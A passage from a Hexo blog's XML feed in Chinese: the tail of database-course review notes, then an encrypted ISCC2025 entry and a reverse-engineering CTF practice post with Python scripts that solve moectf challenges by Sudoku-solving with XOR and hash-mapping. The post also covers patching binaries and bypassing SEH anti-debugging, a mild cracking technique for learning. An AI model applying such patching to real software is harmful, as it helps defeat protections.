mode：IN、OUT、INOUT</li></ul><p>调用：CALL 存储过程名 (参数列表)</p><p>条件语句，循环语句等语法</p><p>cursor</p><h3 id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h3><p>SQL 识别更详细的权限集，在关系上，一共 9 种：</p><ol><li><code>SELECT [on relation | attributes list]</code> 查询的权限</li><li><code>INSERT [on relation | attributes list]</code> 插入元组的权限</li><li><code>DELETE</code> 删除元组的权限</li><li><code>UPDATE [on relation | attributes list]</code> 更新元组的权限</li><li><code>REFERENCE [on relation | attributes list]</code> 被约束引用的权限</li><li><code>USAGE [模式元素 除了关系和断言]</code> 在自己的声明中使用这个元素的权限</li><li><code>TRIGGER [on relation]</code> 在关系上定义触发器的权限</li><li><code>EXECUTE</code> 执行代码的权限，例如 PSM 存储过程或函数</li><li><code>UNDER</code> 在给定类型创建子类型的权限</li></ol><p>授予权限：GRANT &lt;权限列表&gt;<br>ON &lt;关系名或视图名&gt;<br>TO &lt;用户或角色列表&gt;;</p><p>在默认方式下，被授予权限的用户&#x2F;角色无权把得到的权限再授予给另外的用户&#x2F;角色。</p><p>GRANT &lt;权限列表&gt;<br>ON &lt;关系名或视图名&gt;<br>TO &lt;用户或角色列表&gt;<br>WITH GRANT&#x2F;ADMIN OPTION;</p><p>加上 <code>WITH GRANT OPTION</code>，表示被授权的用户可以<strong>把这个权限再授权给其他人</strong>。</p><p>收回权限：REVOKE &lt;权限列表&gt;<br>ON &lt;关系名或视图名&gt;<br>FROM &lt;用户或角色列表&gt;;</p><p>假如超级管理员U1授权给U2，U2又授权给U3，U3又授权给了U4，当U1要收回U2的授权时，U3和U4的授权也被收回。这种从一个用户&#x2F;角色收回权限可能导致其他用户&#x2F;角色也失去该权限，这一行为称作级联收回。</p><p>对于使用with admin option授予权限的用户，系统收回其权限时，不会级联收回。</p><ul><li><code>CASCADE</code>：收回权限时也要收回那些仅仅由于要收回权限而被授予的权限</li><li><code>RESTRICT</code>：如果权限被传递给其他人，收权语句不执行</li></ul><p>授权图</p><p>AP表示授权ID A有权限P,AP*表示有授权选项，AP**表示A是权限P的属主</p><p>当 A 授权 P 给 B，则在 AP* 或 AP** 到 BP 间画一条边（如果有授权选项，则是 BP*）</p><p>基本规则：用户 C 有权限 Q，只要从 XP** 到 CQ&#x2F;CQ*&#x2F;CQ** 有边，且 P 是 Q 的父权限。（P 可能是 Q，X 可能是 C）</p><p>A 级联收回 B 的 P 权限，则删除从 AP 到 BP 的边。</p><p>A RESTRICT 收回 B 的 P 权限，且 BP 有出发的边，则拒绝收权，无事发生。</p><h2 id="数据库恢复"><a href="#数据库恢复" class="headerlink" title="数据库恢复"></a>数据库恢复</h2><h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>显式定义：</p><ul><li><code>BEGIN TRANSACTION 语句 COMMIT</code>：提交，事务正常结束</li><li><code>BEGIN TRANSACTION 语句 ROLLBACK</code>：回滚到事务开始时状态，事务非正常结束</li></ul><p>隐式定义：</p><ul><li>每一个查询或更新语句都是一个事务</li></ul><p>提交 COMMIT：</p><ul><li>事务完成</li><li>数据库更新将永久保存</li></ul><p>回滚 ROLLBACK：</p><ul><li>事务 abort</li><li>对数据库没有影响</li><li>举例：除以 0、违反约束</li></ul><p>原语操作：</p><p>x 是数据库元素</p><ul><li>INPUT(x)：将包含 x 的磁盘块拷贝到内存缓冲区</li><li>OUTPUT(x)：将包含 x 的缓冲区拷贝回磁盘</li><li>READ(x,t)：将内存缓冲区的 x 拷贝到事务的局部变量 t</li><li>WRITE(x,t)：将局部变量 t 的值拷贝到内存缓冲区的 x</li></ul><h3 id="undo-logging"><a href="#undo-logging" class="headerlink" title="undo logging"></a>undo logging</h3><p>保证事务原子性（整体被执行&#x2F;不执行）的一种方法</p><p>在系统故障之前，通过撤销可能未完成的事务的影响来修复数据库状态</p><p>仅更新记录&lt;T,X,v&gt;</p><p>事务T更改了数据库元素X，更改前的值为v</p><p>更新记录所反映的改变通常发生在主存中而不是磁盘上，即日志记录是对 WRITE 做出的反应，而不是对 OUTPUT 做出的反应</p><p>undo-logging rules:</p><ul><li>U1：如果事务 T 改变了数据库元素 X，那么形如 &lt;T, X, *v*&gt; 的日志记录必须在 X 的新值写到磁盘前写到磁盘</li><li>U2：如果事务提交，则其 COMMIT 日志记录必须在事务改变的所有数据库元素已写到磁盘后再写到磁盘，但应尽快</li></ul><p>必须按照以下顺序写入磁盘：</p><p>1.显示数据库元素发生变化的日志记录</p><p>2.变更后的元素本身</p><p>3.提交日志记录</p><p>为了强制将日志记录写到磁盘，日志记录需要一条刷新日志命令，告诉缓冲区管理器：将以前没有拷贝到磁盘的日志记录、从上一次拷贝以来已发生修改的日志记录拷贝到磁盘，FLUSH LOG</p><p>事务管理器需要告诉缓冲区管理器：在某个数据库元素上执行 OUTPUT 动作</p><h3 id="redo-logging"><a href="#redo-logging" class="headerlink" title="redo logging"></a>redo logging</h3><p>在事务修改数据后，将新值写入日志</p><p>延迟修改：数据修改后暂存内存，提交后批量写入磁盘</p><p>写入磁盘顺序：日志-&gt;COMMIT-&gt;数据</p><p>undo&#x2F;redo:同时记录旧值和新值</p><p>数据库恢复机制</p><p>undo&#x2F;redo模型</p><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><strong>Redo 所有已提交事务（COMMIT）</strong></td><td>即使数据页已在内存或磁盘中，也要重做已提交事务的操作，确保持久性。</td></tr><tr><td><strong>Undo 所有未提交事务</strong></td><td>撤销所有未提交事务对数据库的修改（从日志中恢复“旧值”）</td></tr></tbody></table><p>恢复操作：日志回放，倒序扫描</p><p>追加日志：&lt;UNDO T1, B, 21, 20&gt;<br>&lt;UNDO T1, D, 41, 40&gt;<br><ABORT t1></ABORT></p><h2 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h2><p><img src="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/image-20250604191924848.png" alt="image-20250604191924848"></p><p>两个操作属于冲突操作，必须满足：</p><ol><li>它们作用于<strong>同一数据项</strong>；</li><li>它们<strong>至少一个是写操作</strong>；</li><li>它们属于<strong>不同的事务</strong></li></ol><table><thead><tr><th>概念</th><th>一句话定义</th><th>区别</th></tr></thead><tbody><tr><td><strong>可串行化</strong></td><td>一个调度如果<strong>等价于某个串行执行的调度</strong>，就是可串行化。</td><td>强调效果一样</td></tr><tr><td><strong>冲突可串行化</strong></td><td>如果一个调度<strong>通过交换不冲突的操作可以变成某个串行调度</strong>，就是冲突可串行化。</td><td>强调操作顺序一样</td></tr></tbody></table><p>冲突可串行化是可串行化的子集</p><p>优先关系图</p><p>检查一个调度是不是冲突可串行化的。</p><p>结点：调度的事务，标下标</p><p>边：Ti → Tj，指 Ti 优先于 Tj，写做 Ti &lt; sTj，满足：</p><ul><li>Ti 的动作 A1、Tj 的动作 A2</li><li>调度 S 中 A1 在 A2 之前</li><li>A1 和 A2 涉及同一数据库元素，且二者中至少一个是写</li></ul><p>构建优先图，判断是否有环</p><p>二阶段锁协议要求：一个事务加锁和释放锁分为两个阶段，加完锁之后就不能再加锁，只能释放。</p><p>为什么二阶段锁有效？</p><p><strong>如果只有加锁阶段（没解锁）</strong> ⇒ 死锁、资源不释放；</p><p><strong>如果加锁和解锁随意交错</strong> ⇒ 事务可以“插队”改变本应串行的顺序 ⇒ 出现并发异常（脏读、不可重复读等）；</p><p>所以二阶段锁是实现串行化的<strong>恰好最小限制条件</strong>。</p><p>锁</p><p>共享锁（shared-lock):允许多个事务并发读取数据，不能修改数据</p><p>排他锁（exclusive lock):事务可以读写数据</p><p>更新锁（update lock):为了防止死锁设计，用于“读后写”的场景：先加更新锁，准备更新数据，等确认写时再升级为排他锁。</p><p>一个资源只能有一个更新锁，但与共享锁兼容。</p>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2025</title>
      <link href="/2025/05/09/ISCC2025/"/>
      <url>/2025/05/09/ISCC2025/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4fa7d3d5c881124fcc6402f15df9f678635d7ac584bdc0ef853a4c07b2bc4ab1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强壮逆向人!</title>
      <link href="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/"/>
      <url>/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<p>好好学逆向</p><p>moectf题真的好，每日一题</p><p>2025.6.19   考完试一定写🥲</p><p>2025.7.19 会写的会写的😫</p><h2 id="A-game"><a href="#A-game" class="headerlink" title="A_game"></a>A_game</h2><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/1.png" alt="1"></p><p>好清晰的逻辑，好清晰的函数名🥲 首先输入49个字符的字符串，将这49个字符填入9x9的box数组中值为0的位置，经过3个check函数验证是否正确，如果正确，那么将str与magic数组异或得到flag</p><p>接下来我们查看check1函数的代码</p><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/2.png" alt="2"></p><p>每一行必须包含数字 1～9，不能重复，也不能缺少</p><p>check2函数：每一列必须包含数字 1～9，不能重复，也不能缺少</p><p>check3函数：每一个 3x3 小宫格中都包含 1~9 各一次</p><p>很明显，这是数独游戏的规则，我们需要填入正确的49个数字</p><p>直接用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line">box=[<span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">3</span>,   <span class="number">6</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">4</span>,</span><br><span class="line">     <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">9</span>,   <span class="number">6</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">8</span>,</span><br><span class="line">     <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,</span><br><span class="line">     <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把box转换为二维列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_grid</span>(<span class="params">flat: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    <span class="keyword">return</span> [flat[i*<span class="number">9</span>:(i+<span class="number">1</span>)*<span class="number">9</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数独求解器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">grid, row, col, num</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> grid[row][i] == num <span class="keyword">or</span> grid[i][col] == num:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    start_row, start_col = <span class="number">3</span>*(row//<span class="number">3</span>), <span class="number">3</span>*(col//<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> grid[start_row+i][start_col+j] == num:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">grid</span>):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> grid[row][col] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">if</span> is_valid(grid, row, col, num):</span><br><span class="line">                        grid[row][col] = num</span><br><span class="line">                        <span class="keyword">if</span> solve(grid):</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                        grid[row][col] = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录原始空位</span></span><br><span class="line">empty_indices = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">81</span>) <span class="keyword">if</span> box[i] == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解题并构造 Str</span></span><br><span class="line">grid = to_grid(box.copy())</span><br><span class="line"><span class="keyword">if</span> solve(grid):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Sudoku Solved:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> grid:</span><br><span class="line">        <span class="built_in">print</span>(row)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拼接填入空位的字符，作为 Str</span></span><br><span class="line">    Str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(grid[i//<span class="number">9</span>][i%<span class="number">9</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> empty_indices)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Final Str (49 input chars):\n<span class="subst">&#123;Str&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] No solution found.&quot;</span>)</span><br><span class="line"></span><br><span class="line">magic=[<span class="number">107</span>,   <span class="number">2</span>, <span class="number">102</span>, <span class="number">112</span>,  <span class="number">68</span>, <span class="number">105</span>, <span class="number">126</span>, <span class="number">110</span>,  <span class="number">67</span>,  <span class="number">74</span>,</span><br><span class="line"><span class="number">120</span>,  <span class="number">74</span>, <span class="number">109</span>,  <span class="number">96</span>,  <span class="number">86</span>,   <span class="number">0</span>,  <span class="number">81</span>,  <span class="number">89</span>,  <span class="number">80</span>,  <span class="number">67</span>,</span><br><span class="line"><span class="number">80</span>,  <span class="number">81</span>, <span class="number">109</span>, <span class="number">116</span>,   <span class="number">2</span>,  <span class="number">85</span>,  <span class="number">80</span>,  <span class="number">82</span>, <span class="number">110</span>, <span class="number">111</span>,</span><br><span class="line"><span class="number">121</span>,  <span class="number">64</span>,  <span class="number">93</span>,  <span class="number">75</span>,  <span class="number">30</span>,  <span class="number">25</span>,  <span class="number">28</span>, <span class="number">116</span>,   <span class="number">3</span>,  <span class="number">84</span>,</span><br><span class="line"><span class="number">7</span>,  <span class="number">76</span>,  <span class="number">82</span>, <span class="number">106</span>,  <span class="number">96</span>,  <span class="number">80</span>,  <span class="number">88</span>,  <span class="number">64</span>,  <span class="number">88</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(Str[i]) ^ magic[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] Flag: moectf&#123;&#123;<span class="subst">&#123;flag&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Android-Cracker"><a href="#Android-Cracker" class="headerlink" title="Android_Cracker"></a>Android_Cracker</h2><p>用jadx打开找到MainActivity打开就是了</p><h2 id="Broken-hash"><a href="#Broken-hash" class="headerlink" title="Broken_hash"></a>Broken_hash</h2><p>没做出来，复现一下</p><p>有一个师傅的解法很简单：</p><p>这个程序需要输入88位字符，经过变种SHA1算法转化，再和一个数组比较</p><p>先输入88个a，下断点动调</p><p>看到了加密后的数组,发现<code>a</code>变成<code>0x0D7C1A410</code></p><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/3.png" alt="3"></p><p>所以可以输入abcdefghijklmnopqrstuvwxyz1234567890_!ABCDEFGHIJKLMNOPQRSTUVWXYZ{}aaaaaaaaaaaaaaaaaaaaaa</p><p>建立一个映射表</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x64744C9A</span>, <span class="number">0x047C2FF1</span>, <span class="number">0xA2D74292</span>, <span class="number">0x85BEF77E</span>, <span class="number">0x711FCBF7</span>, <span class="number">0x669E1609</span>, <span class="number">0x6BBD9DB6</span>, <span class="number">0x6941C8A4</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xDE321186</span>, <span class="number">0x5251E8C2</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0x36568AF5</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x82ACF96A</span>, <span class="number">0x75DCD570</span>, <span class="number">0x7EF00E40</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x4BE9314A</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0xA2D74292</span>, <span class="number">0xDE321186</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x46927FA8</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xD7C1A410</span>, <span class="number">0x567375C3</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9C19F0F3</span>, <span class="number">0xD035E914</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x6941C8A4</span>, <span class="number">0x0B7D1395</span>, <span class="number">0xD7C1A410</span>, <span class="number">0xC87A7C7E</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD7C1A410</span>, <span class="number">0xDE321186</span>, <span class="number">0x5251E8C2</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD5380C52</span>, <span class="number">0xBEA99D3B</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x73456320</span>,</span><br><span class="line">     <span class="number">0xD7C1A410</span>, <span class="number">0xDE321186</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x581D99E5</span>, <span class="number">0xA2D74292</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x06372812</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x73456320</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xEF53E254</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9F12424D</span>, <span class="number">0x669E1609</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9C19F0F3</span>, <span class="number">0xFECF7685</span>, <span class="number">0x0B7D1395</span>, <span class="number">0x1833E8B1</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9F66DD04</span>, <span class="number">0xA2D74292</span>, <span class="number">0xD7C1A410</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x6941C8A4</span>, <span class="number">0x866CAF4F</span>, <span class="number">0x047C2FF1</span>, <span class="number">0x64744C9A</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD5380C52</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xDE321186</span>, <span class="number">0x81453D43</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xC578F843</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xDE321186</span>, <span class="number">0xE38C6F07</span>, <span class="number">0x8B9E97A8</span>, <span class="number">0x8FDF9EDF</span>, <span class="number">0xD1868B96</span>, <span class="number">0x93AFD1D1</span>, <span class="number">0x8D8BDF85</span>, <span class="number">0x989EDF86</span>, <span class="number">0xDF91969E</span>, <span class="number">0xF5C3A0C1</span>, <span class="number">0x00000000</span>][:<span class="number">88</span>]</span><br><span class="line">b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890_!ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;aaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">c = [<span class="number">0x0D7C1A410</span>, <span class="number">0x9E3919E7</span>, <span class="number">0x85BEF77E</span>, <span class="number">0x5251E8C2</span>, <span class="number">0x0A2D74292</span>, <span class="number">0x669E1609</span>, <span class="number">0x5C1DFF11</span>, <span class="number">0x0CB5C3FAD</span>, <span class="number">0x0FECF7685</span>, <span class="number">0x0B0F33A9A</span>, <span class="number">0x1833E8B1</span>, <span class="number">0x0B7D1395</span>, <span class="number">0x64744C9A</span>, <span class="number">0x0DE321186</span>, <span class="number">0x47C2FF1</span>, <span class="number">0x0EF53E254</span>, <span class="number">0x1902B329</span>, <span class="number">0x866CAF4F</span>, <span class="number">0x4A528AE0</span>, <span class="number">0x711FCBF7</span>, <span class="number">0x0CEDB7952</span>, <span class="number">0x352B172C</span>, <span class="number">0x0AFEA7FF6</span>, <span class="number">0x3175EDAB</span>, <span class="number">0x0D035E914</span>, <span class="number">0x20D324AE</span>, <span class="number">0x0B16E48B3</span>, <span class="number">0x5C6054F</span>, <span class="number">0x36568AF5</span>, <span class="number">0x0BEA2375F</span>, <span class="number">0x567375C3</span>, <span class="number">0x0BF0FD0CB</span>, <span class="number">0x4BE9314A</span>, <span class="number">0x7F2A2EBE</span>, <span class="number">0x0C87A7C7E</span>, <span class="number">0x0BEA99D3B</span>, <span class="number">0x0FB8F95A7</span>, <span class="number">0x94D2FB03</span>, <span class="number">0x6372812</span>, <span class="number">0x46927FA8</span>, <span class="number">0x73456320</span>, <span class="number">0x4E3F843</span>, <span class="number">0x75DCD570</span>, <span class="number">0x6941C8A4</span>,</span><br><span class="line">     <span class="number">0x581D99E5</span>, <span class="number">0x7EF00E40</span>, <span class="number">0x7A260E4D</span>, <span class="number">0x0C578F843</span>, <span class="number">0x17947C53</span>, <span class="number">0x786C70</span>, <span class="number">0x9C19F0F3</span>, <span class="number">0x1D795AC9</span>, <span class="number">0x9F12424D</span>, <span class="number">0x0AB021E08</span>, <span class="number">0x77ACB10</span>, <span class="number">0x0D1D0F68E</span>, <span class="number">0x82ACF96A</span>, <span class="number">0x9F66DD04</span>, <span class="number">0x8AD9BAF7</span>, <span class="number">0x0AAE6D8C9</span>, <span class="number">0x0E73CAEF</span>, <span class="number">0x0BFC92893</span>, <span class="number">0x0D5380C52</span>, <span class="number">0x81453D43</span>, <span class="number">0x6BBD9DB6</span>, <span class="number">0x0E38C6F07</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(b[c.index(i)], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>官方wp：考察SEH，patch程序，以及编写交互脚本</p><p>本题使用了一个哈希算法（SHA1，魔改了部分参数）对flag每一位计算哈希，然后跟密文对比验证。当然，只取了最终哈希值的前4个字节（防止直接用SHA1去查彩虹表）。 预期解法是去patch程序输出，让程序能够输出check过的长度（即for循环中的i）。具体而言，这个循环是每次验证一位，不正确就退出循环，所以当我们的输入只有前3个字符正确的时候，i退出时应该是3；前4个字符正确的时候，i退出时应该是4。我们想办法让程序输出这个i，然后每一位去尝试每一个可见字符。i每自增一次，我们就知道当前这一位字符是正确的。当然了，这道题使用异常处理隐藏了真正的输出，真正的输出字符附在密文的最后，进行了一个异或0xff的解密之后才输出。，且加了反调试，如果是在调试状态下，不会进入异常，会进入假的print。</p><p>SEH异常处理机制</p><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/4.png" alt="4"></p><p>找到了异常处理函数,这个函数作用是打印flag，patch一下</p><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/5.png" alt="5"></p><p>还没成功，再研究一下</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web签个到</title>
      <link href="/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/"/>
      <url>/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/</url>
      
